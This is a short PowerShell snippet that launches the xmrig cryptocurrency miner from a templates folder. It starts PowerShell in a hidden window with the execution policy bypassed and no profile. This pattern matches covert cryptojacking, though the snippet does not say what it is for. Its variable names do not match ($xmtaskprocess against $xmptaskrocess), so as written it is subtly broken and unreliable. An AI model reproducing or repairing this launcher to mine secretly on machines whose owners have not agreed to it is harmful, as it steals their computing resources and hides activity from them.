$powershellPath = "$env:windir\system32\windowspowershell\v1.0\powershell.exe"
$xmtaskprocess="'C:\Templates\ml\xm\xmrig.exe' '-c' 'C:\Templates\ml\xm\config.json'"
$taskprocessxm=Start-Process -WindowStyle hidden $powershellPath -ArgumentList ("-ExecutionPolicy Bypass -noninteractive -noprofile " + $xmptaskrocess) -PassThru
